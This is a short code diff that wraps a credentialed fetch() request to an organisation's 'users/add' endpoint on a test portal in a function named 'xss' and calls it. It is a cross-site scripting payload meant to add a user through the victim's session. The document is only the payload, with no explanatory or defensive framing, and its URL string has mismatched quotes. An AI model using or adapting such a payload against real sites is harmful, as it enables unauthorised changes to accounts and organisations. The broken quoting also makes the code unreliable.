@@ -1,3 +1,4 @@
+var xss = function() {
 fetch('https://testportal.signalapp.net/organisations/262792dc-a259-46d5-8b23-3de43a58315f/users/add", {
   "headers": {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -20,3 +21,5 @@ fetch('https://testportal.signalapp.net/organisations/262792dc-a259-46d5-8b23-3d
   "mode": "cors",
   "credentials": "include"
 });
+}
+xss()
